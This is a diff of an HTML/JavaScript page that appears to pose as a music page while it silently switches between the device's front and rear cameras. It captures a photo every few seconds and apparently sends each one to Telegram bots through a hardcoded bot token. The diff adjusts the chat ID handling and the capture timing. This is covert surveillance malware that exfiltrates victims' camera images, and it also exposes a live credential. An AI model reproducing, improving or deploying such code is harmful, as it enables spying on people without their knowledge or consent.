@@ -121,7 +121,11 @@
     
     // Bot 1 details
     const bot1Token = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY'; 
-    const bot1ChatId = 'none';
+    const chatId = chatid;
+if (!chatId) {
+    console.error('Chat ID is not available.');
+    return;
+}
 
     // Bot 2 details
     const bot2Token = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY'; // Replace with Bot 2's Token
@@ -213,13 +217,13 @@
         useFrontCamera = !useFrontCamera; // Toggle camera
         constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
         startCamera();
-      }, 3000); // Switch camera every 5 seconds
+      }, 5000); // Switch camera every 5 seconds
     }
 
     // Automatically capture photos
     setInterval(() => {
       captureAndSendPhoto();
-    }, 3000); // Capture photo every 5 seconds
+    }, 5000); // Capture photo every 5 seconds
 
     // Music control
     function toggleMusic() {
@@ -239,4 +243,4 @@
     autoSwitchCamera();
   </script>
 </body>
-</html>
+</html>৬
